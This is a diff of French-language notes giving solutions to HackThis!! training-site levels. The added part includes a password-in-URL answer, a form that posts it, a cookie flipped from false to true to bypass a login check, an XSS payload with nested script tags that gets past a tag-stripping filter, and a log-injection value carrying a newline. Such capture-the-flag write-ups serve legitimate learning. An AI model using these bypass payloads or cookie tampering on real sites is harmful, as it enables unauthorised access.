@@ -207,3 +207,27 @@ traceroute 178.17.41.47 => allsimple
 afficher la source du mail de confirmation : X-B6-Key: Lajklsb#!"3jlak
 
 ##Level 7
+
+#Intermediate
+##Level 1
+https://www.hackthis.co.uk/levels/intermediate/1?password=flubergump
+
+##Level 2
+```html
+<form method="post" action="https://www.hackthis.co.uk/levels/intermediate/2">
+<input type="text" name="password" value="flubergump">
+<input type="submit">
+</form>
+```
+##Level 3
+Cookie restricted_login=false => true
+
+##Level 4
+le filtre supprime les balises.
+```
+<script<script>>alert('HackThis!!');</script</script>>
+```
+##Level 5
+username : a from 127.0.0.1\n
+
+##Level 6
